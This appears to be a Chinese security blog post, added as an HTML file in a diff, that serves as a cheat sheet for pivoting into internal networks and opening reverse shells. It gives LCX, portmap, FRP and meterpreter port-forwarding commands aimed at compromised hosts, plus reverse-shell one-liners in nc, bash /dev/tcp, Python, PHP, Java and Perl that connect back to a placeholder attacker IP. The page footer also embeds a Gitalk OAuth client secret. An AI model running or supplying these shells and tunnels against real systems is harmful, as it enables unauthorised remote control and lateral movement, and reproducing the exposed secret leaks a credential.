@@ -1,0 +1,662 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="网络安全,攻防研究" />
+  <meta name="author" content="B Stark" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      内网端口转发及shell反弹 
+      
+      
+      |
+    
+     B.Stark&#39;Blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.png">
+    <link rel="icon" href="/images/favicon.png">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/color-scheme.css">
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+<link rel="stylesheet" href="/css/comments.css">
+
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+
+<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="B.Stark'Blog" type="application/atom+xml">
+</head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">BStark</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">内网端口转发及shell反弹</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="更新时间"></i>
+          2022-01-08 20:54:52
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags" title="标签"></i>
+                
+                <span class="span--tag">
+                  <a href="/tags/%E5%86%85%E7%BD%91/" title="内网">
+                    <b>#</b> 内网
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h2 id="端口转发工具-LCX"><a href="#端口转发工具-LCX" class="headerlink" title="端口转发工具 LCX"></a>端口转发工具 LCX</h2><h3 id="Windows-LCX"><a href="#Windows-LCX" class="headerlink" title="Windows LCX"></a>Windows LCX</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">• 转发端口：lcx.exe –slave 公网主机IP 端口 内网主机IP 端口</span><br><span class="line">• 监听端口：lcx.exe –listen 转发端口 本机任意没有被占用的端口</span><br><span class="line">• 映射端口：lcx.exe -tran 映射端口号 目标ip 目标端口</span><br></pre></td></tr></table></figure>
+
+<p><strong>本地端口映射:</strong></p>
+<p>场景一:</p>
+<p>主机的3389端口只对内开放，不对外开放,需要端口映射到本机一个开放端口且没有绑定服务的端口,然后访问这个映射后的端口即可连上主机的3389.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe –tran 53 127.0.0.1 3389</span><br></pre></td></tr></table></figure>
+
+<p>场景二:</p>
+<p>攻击机 —–&gt;(A)web服务器192.168.10.10——-&gt;(B)内网web服务器192.168.10.11</p>
+<p>攻击机只能访问双网卡的主机(A)web服务器,我们无法直接访问同内网的主机B.通过端口映射可以把内网主机B的80端口映射出来,我们只需要访问主机A192.168.10.11:8080 即是访问主机B的80端口.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx.exe –tran 8080 192.168.10.11 80</span><br></pre></td></tr></table></figure>
+
+<p><strong>内网端口转发</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">转发端口：lcx.exe –slave 公网IP 公网端口 肉鸡的内网IP 肉鸡端口</span><br><span class="line">监听端口：lcx.exe –listen 转发端口 本机任意没有被占用的端口</span><br></pre></td></tr></table></figure>
+
+<p><strong>本机:</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx -listen 2222 3333</span><br></pre></td></tr></table></figure>
+
+<p>2222为转发端口，3333为本机任意未被占用的端口</p>
+<p><strong>肉鸡：</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lcx -slave 119.75.217.56 2222 127.0.0.1 3389</span><br></pre></td></tr></table></figure>
+
+<p>119.75.217.56 为本机IP,2222为转发端口，127.0.0.1为肉鸡内网IP，3389为远程终端端口</p>
+<p>3389连接时格式 127.0.0.1:3333</p>
+<h3 id="linux-portmap-lcx"><a href="#linux-portmap-lcx" class="headerlink" title="linux portmap(lcx)"></a>linux portmap(lcx)</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Usage:./portmap -m method [-h1 host1] -p1 port1 [-h2 host2] -p2 port2 [-v] [-<span class="built_in">log</span> filename]</span><br><span class="line">-v: version</span><br><span class="line">-h1: host1</span><br><span class="line">-h2: host2</span><br><span class="line">-p1: port1</span><br><span class="line">-p2: port2</span><br><span class="line">-<span class="built_in">log</span>: <span class="built_in">log</span> the data</span><br><span class="line">-m: the action method <span class="keyword">for</span> this tool</span><br><span class="line">1: listen on PORT1 and connect to HOST2:PORT2</span><br><span class="line">2: listen on PORT1 and PORT2</span><br><span class="line">3: connect to HOST1:PORT1 and HOST2:PORT2</span><br></pre></td></tr></table></figure>
+
+<p><strong>内网主机端口转发:</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./portmap -m 3 -h1 127.0.0.1 -p1 22 -h2 118.*.*.* -p2 6666</span><br></pre></td></tr></table></figure>
+
+<p><strong>公网主机监听端口:</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./portmap -m 2 -p1 6666 -h2 118.*.*.* -p2 7777</span><br></pre></td></tr></table></figure>
+
+<p>开始监听6666传来的数据，然后监听7777端口提供访问</p>
+<h2 id="端口转发工具-FRP"><a href="#端口转发工具-FRP" class="headerlink" title="端口转发工具 FRP"></a>端口转发工具 FRP</h2><p>frps</p>
+<p>frps.ini</p>
+<p>服务端程序和服务端配置文件（s结尾代表server)</p>
+<p>frpc</p>
+<p>frpc.ini</p>
+<p>客户端程序和客户端配置文件（c结尾代表client）</p>
+<p><strong>frps.ini格式为:</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[common] </span><br><span class="line">bind_port = 7000 <span class="comment">#frp服务器监听端口</span></span><br><span class="line">dashboard_port = 7500 <span class="comment">#web后台监听端口</span></span><br><span class="line">dashboard_user = admin <span class="comment">#web后台的用户名和密码</span></span><br><span class="line">dashboard_pwd = admin</span><br><span class="line">token = 123456 <span class="comment">#用于客户端和服务端连接的口令，请自行设置并记录</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>运行:</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frps -c frps.ini</span><br></pre></td></tr></table></figure>
+
+<p><strong>frpc.ini格式为:</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr = 192.168.152.217 <span class="comment">#服务端IP地址</span></span><br><span class="line">server_port = 7000 <span class="comment">#服务器端口</span></span><br><span class="line">token = 123456 <span class="comment">#服务器上设置的连接口令</span></span><br><span class="line">[rdp] <span class="comment">#自定义规则，[xxx]表示规则名</span></span><br><span class="line"><span class="built_in">type</span> = tcp <span class="comment">#type：转发的协议类型</span></span><br><span class="line">local_ip = 127.0.0.1 </span><br><span class="line">local_port = 3389 <span class="comment">#本地应用的端口号</span></span><br><span class="line">remote_port = 7001 <span class="comment">#这条规则在服务端开放的端口号</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>运行:</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./frpc -c frpc.ini</span><br></pre></td></tr></table></figure>
+
+<h2 id="meterpreter-Portfwd"><a href="#meterpreter-Portfwd" class="headerlink" title="meterpreter Portfwd"></a>meterpreter Portfwd</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Ø 选项</span><br><span class="line">• -L：要监听的本地主机（可选）</span><br><span class="line">• -h：帮助信息</span><br><span class="line">• -l：要监听的本地端口，与此端口的连接将被转发到远程系统</span><br><span class="line">• -p：要连接的远程端口，TCP连接将转发到的端口</span><br><span class="line">• -r：要连接的远程主机的IP地址</span><br><span class="line">Ø 参数</span><br><span class="line">• Add：该参数用于创建转发</span><br><span class="line">• Delete：这将从转发端口列表中删除先前的条目</span><br><span class="line">• List：列出当前转发的所有端口</span><br><span class="line">• Flush：这将删除转发列表中的所有端</span><br></pre></td></tr></table></figure>
+
+<p><strong>ADD</strong></p>
+<p>• add：将端口转发添加到列表中，并创建一个隧道</p>
+<p> • -l：本地端口，将被监听并转发到我们的目标，这可以是机器上上的任何端口，只要它尚未被使用的</p>
+<p> • -p：是目标机上的目标端口</p>
+<p> • -r [target host] 是目标机的IP或主机名</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd add –l 本地监听端口号 –p 目标端口号 –r 目标机的IP地址</span><br></pre></td></tr></table></figure>
+
+<p><strong>Delete</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd delete –l 本地监听端口号 –p 目标端口号 –r 目标机的IP地址</span><br></pre></td></tr></table></figure>
+
+<p><strong>List</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd list    <span class="comment">#列出所有转发规则</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Flush</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; portfwd flush   <span class="comment">#清空所有规则</span></span><br></pre></td></tr></table></figure>
+<h2 id="NC反弹shell"><a href="#NC反弹shell" class="headerlink" title="NC反弹shell"></a>NC反弹shell</h2><p><strong>反向shell</strong></p>
+<p>攻击机:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvp 8080  //lvnp 8080</span><br></pre></td></tr></table></figure>
+
+<p>肉鸡端:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc 攻击机IP 监听端口号 –e /bin/bash <span class="comment">#Linux</span></span><br><span class="line">nc 攻击机IP 监听端口号 –e c:\windows\system32\cmd.exe <span class="comment">#Windows</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>正向shell</strong></p>
+<p>攻击机:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 目标主机IP地址 端口号</span><br></pre></td></tr></table></figure>
+
+<p>肉鸡端:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nc –lvp 端口号 –e /bin/bash <span class="comment">#Linux</span></span><br><span class="line">nc -lvp 端口号 –e c:\windows\system32\cmd.exe <span class="comment">#Windows</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="其他反弹shell"><a href="#其他反弹shell" class="headerlink" title="其他反弹shell"></a>其他反弹shell</h2><p><strong>攻击机监听:</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc –lvvp 4444</span><br></pre></td></tr></table></figure>
+
+<p><strong>bash 反弹shell</strong></p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash <span class="operator">-</span>i <span class="operator">&gt;</span><span class="operator">&amp;</span> <span class="operator">/</span>dev<span class="operator">/</span>tcp<span class="operator">/</span>攻击机IP<span class="operator">/</span>监听端口号 <span class="number">0</span><span class="operator">&gt;</span><span class="operator">&amp;</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>python反弹shell</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c <span class="string">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;攻击</span></span><br><span class="line"><span class="string">机IP地址&quot;,监听端口号));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);</span></span><br><span class="line"><span class="string">os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p> <strong>PHP 反弹shell</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -r <span class="string">&#x27;$sock=fsockopen(&quot;攻击机IP地址&quot;,监听端口号);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>JAVA 反弹shell</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">&quot;/bin/bash&quot;</span>,<span class="string">&quot;-c&quot;</span>,<span class="string">&quot;exec 5&lt;&gt;/dev/tcp/攻击机IP地址/监听端口号;cat &lt;&amp;5 | while read line; do <span class="variable">$line</span></span></span><br><span class="line"><span class="string">2&gt;&amp;5 &gt;&amp;5; done&quot;</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>
+
+<p><strong>Perl 反弹shell</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">perl -e <span class="string">&#x27;use Socket;$i=&quot;攻击机IP地址&quot;;$p=监听端口</span></span><br><span class="line"><span class="string">号;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;ope</span></span><br><span class="line"><span class="string">n(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;/bin/sh -i&quot;);&#125;;&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>socks4的代理，只能使用tcp协议</p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/posts/16430/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="更新时间"></i>
+              2022-01-08 20:54:52
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags" title="标签"></i>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/%E5%86%85%E7%BD%91/" title="内网">
+                        <b>#</b> 内网
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/posts/13084/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%B7%A5%E5%85%B7-LCX"><span class="toc-text">端口转发工具 LCX</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Windows-LCX"><span class="toc-text">Windows LCX</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#linux-portmap-lcx"><span class="toc-text">linux portmap(lcx)</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%B7%A5%E5%85%B7-FRP"><span class="toc-text">端口转发工具 FRP</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#meterpreter-Portfwd"><span class="toc-text">meterpreter Portfwd</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#NC%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">NC反弹shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%8F%8D%E5%BC%B9shell"><span class="toc-text">其他反弹shell</span></a></li></ol>
+    </div>
+  </div>
+
+  
+<script src="/js/catalog.js"></script>
+
+
+
+
+    
+      <div class="comments-container">
+        
+
+
+
+
+  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.css">
+  <script src="https://cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+  <script src="/js/src/md5.min.js"></script>
+  <div id="gitalk-container"></div>
+
+  <script>
+    const gitalk = new Gitalk({
+      clientID: 'a8912b1aa74ebdeb8ecf',
+      clientSecret: '2e09f32571113ed72c6902713871ee0702291593',
+      repo: 'bstark',
+      owner: 'bbbstark',
+      admin: ['bbbstark'],
+      id: location.pathname,
+      distractionFreeMode: false
+    })
+
+    gitalk.render('gitalk-container')
+  </script>
+
+
+      </div>
+    
+  </div>
+
+
+        <div class="footer">
+  <div class="social">
+    <ul>
+      
+        <li>
+          <a title="github" target="_blank" rel="noopener" href="https://github.com/bbbstark">
+            <i class="iconfont icon-github"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="email" href="">
+            <i class="iconfont icon-envelope"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="facebook" href="">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="twitter" href="">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="wechat" href="">
+            <i class="iconfont icon-wechat"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="weibo" href="">
+            <i class="iconfont icon-weibo"></i>
+          </a>
+        </li>
+      
+        <li>
+          <a title="rss" href="/atom.xml">
+            <i class="iconfont icon-rss"></i>
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+  
+    <div class="footer-more">
+      
+        <a href="https://bstark.me">Copyright © Bstark 2021</a>
+        
+    </div>
+  
+    <div class="footer-more">
+      
+        Theme by Oranges | Powered by Hexo
+        
+    </div>
+  
+</div>
+
+      </div>
+
+      <div class="tools-bar">
+        <div class="back-to-top tools-bar-item hidden">
+  <a href="javascript: void(0)">
+    <i class="iconfont icon-chevronup"></i>
+  </a>
+</div>
+
+
+<script src="/js/backtotop.js"></script>
+
+
+
+        
+  <div class="search-icon tools-bar-item" id="search-icon">
+    <a href="javascript: void(0)">
+      <i class="iconfont icon-search"></i>
+    </a>
+  </div>
+
+  <div class="search-overlay hidden">
+    <div class="search-content" tabindex="0">
+      <div class="search-title">
+        <span class="search-icon-input">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-search"></i>
+          </a>
+        </span>
+        
+          <input type="text" class="search-input" id="search-input" placeholder="search...">
+        
+        <span class="search-close-icon" id="search-close-icon">
+          <a href="javascript: void(0)">
+            <i class="iconfont icon-close"></i>
+          </a>
+        </span>
+      </div>
+      <div class="search-result" id="search-result"></div>
+    </div>
+  </div>
+
+  <script type="text/javascript">
+    var inputArea = document.querySelector("#search-input")
+    var searchOverlayArea = document.querySelector(".search-overlay")
+
+    inputArea.onclick = function() {
+      getSearchFile()
+      this.onclick = null
+    }
+
+    inputArea.onkeydown = function() {
+      if(event.keyCode == 13)
+        return false
+    }
+
+    function openOrHideSearchContent() {
+      let isHidden = searchOverlayArea.classList.contains('hidden')
+      if (isHidden) {
+        searchOverlayArea.classList.remove('hidden')
+        document.body.classList.add('hidden')
+        // inputArea.focus()
+      } else {
+        searchOverlayArea.classList.add('hidden')
+        document.body.classList.remove('hidden')
+      }
+    }
+
+    function blurSearchContent(e) {
+      if (e.target === searchOverlayArea) {
+        openOrHideSearchContent()
+      }
+    }
+
+    document.querySelector("#search-icon").addEventListener("click", openOrHideSearchContent, false)
+    document.querySelector("#search-close-icon").addEventListener("click", openOrHideSearchContent, false)
+    searchOverlayArea.addEventListener("click", blurSearchContent, false)
+
+    var searchFunc = function (path, search_id, content_id) {
+      'use strict';
+      var $input = document.getElementById(search_id);
+      var $resultContent = document.getElementById(content_id);
+      $resultContent.innerHTML = "<ul><span class='local-search-empty'>首次搜索，正在载入索引文件，请稍后……<span></ul>";
+      $.ajax({
+        // 0x01. load xml file
+        url: path,
+        dataType: "xml",
+        success: function (xmlResponse) {
+          // 0x02. parse xml file
+          var datas = $("entry", xmlResponse).map(function () {
+            return {
+              title: $("title", this).text(),
+              content: $("content", this).text(),
+              url: $("url", this).text()
+            };
+          }).get();
+          $resultContent.innerHTML = "";
+
+          $input.addEventListener('input', function () {
+            // 0x03. parse query to keywords list
+            var str = '<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length <= 0) {
+              return;
+            }
+            // 0x04. perform local searching
+            datas.forEach(function (data) {
+              var isMatch = true;
+              var content_index = [];
+              if (!data.title || data.title.trim() === '') {
+                data.title = "Untitled";
+              }
+              var orig_data_title = data.title.trim();
+              var data_title = orig_data_title.toLowerCase();
+              var orig_data_content = data.content.trim().replace(/<[^>]+>/g, "");
+              var data_content = orig_data_content.toLowerCase();
+              var data_url = data.url;
+              var index_title = -1;
+              var index_content = -1;
+              var first_occur = -1;
+              // only match artiles with not empty contents
+              if (data_content !== '') {
+                keywords.forEach(function (keyword, i) {
+                  index_title = data_title.indexOf(keyword);
+                  index_content = data_content.indexOf(keyword);
+
+                  if (index_title < 0 && index_content < 0) {
+                    isMatch = false;
+                  } else {
+                    if (index_content < 0) {
+                      index_content = 0;
+                    }
+                    if (i == 0) {
+                      first_occur = index_content;
+                    }
+                    // content_index.push({index_content:index_content, keyword_len:keyword_len});
+                  }
+                });
+              } else {
+                isMatch = false;
+              }
+              // 0x05. show search results
+              if (isMatch) {
+                str += "<li><a href='" + data_url + "' class='search-result-title'>" + orig_data_title + "</a>";
+                var content = orig_data_content;
+                if (first_occur >= 0) {
+                  // cut out 100 characters
+                  var start = first_occur - 20;
+                  var end = first_occur + 80;
+
+                  if (start < 0) {
+                    start = 0;
+                  }
+
+                  if (start == 0) {
+                    end = 100;
+                  }
+
+                  if (end > content.length) {
+                    end = content.length;
+                  }
+
+                  var match_content = content.substr(start, end);
+
+                  // highlight all keywords
+                  keywords.forEach(function (keyword) {
+                    var regS = new RegExp(keyword, "gi");
+                    match_content = match_content.replace(regS, "<span class=\"search-keyword\">" + keyword + "</span>");
+                  });
+
+                  str += "<p class=\"search-result-abstract\">" + match_content + "...</p>"
+                }
+                str += "</li>";
+              }
+            });
+            str += "</ul>";
+            if (str.indexOf('<li>') === -1) {
+              return $resultContent.innerHTML = "<ul><span class='local-search-empty'>没有找到内容，请尝试更换检索词。<span></ul>";
+            }
+            $resultContent.innerHTML = str;
+          });
+        },
+        error: function(xhr, status, error) {
+          $resultContent.innerHTML = ""
+          if (xhr.status === 404) {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>未找到search.xml文件，具体请参考：<a href='https://github.com/zchengsite/hexo-theme-oranges#configuration' target='_black'>configuration</a><span></ul>";
+          } else {
+            $resultContent.innerHTML = "<ul><span class='local-search-empty'>请求失败，尝试重新刷新页面或稍后重试。<span></ul>";
+          }
+        }
+      });
+      $(document).on('click', '#search-close-icon', function() {
+        $('#search-input').val('');
+        $('#search-result').html('');
+      });
+    }
+
+    var getSearchFile = function() {
+        var path = "/search.xml";
+        searchFunc(path, 'search-input', 'search-result');
+    }
+  </script>
+
+
+
+
+        
+  <div class="tools-bar-item theme-icon" id="switch-color-scheme">
+    <a href="javascript: void(0)">
+      <i id="theme-icon" class="iconfont icon-moon"></i>
+    </a>
+  </div>
+
+  
+<script src="/js/colorscheme.js"></script>
+
+
+
+
+
+        
+  
+    <div class="share-icon tools-bar-item">
+      <a href="javascript: void(0)" id="share-icon">
+        <i class="iconfont iconshare"></i>
+      </a>
+      <div class="share-content hidden">
+        
+          <a class="share-item" href="https://twitter.com/intent/tweet?text=' + %E5%86%85%E7%BD%91%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91%E5%8F%8Ashell%E5%8F%8D%E5%BC%B9 + '&url=' + https%3A%2F%2Fbstark.me%2Fposts%2F48384%2F + '" target="_blank" title="Twitter">
+            <i class="iconfont icon-twitter"></i>
+          </a>
+        
+        
+          <a class="share-item" href="https://www.facebook.com/sharer.php?u=https://bstark.me/posts/48384/" target="_blank" title="Facebook">
+            <i class="iconfont icon-facebooksquare"></i>
+          </a>
+        
+      </div>
+    </div>
+  
+  
+<script src="/js/shares.js"></script>
+
+
+
+      </div>
+    </div>
+  </body>
+</html>
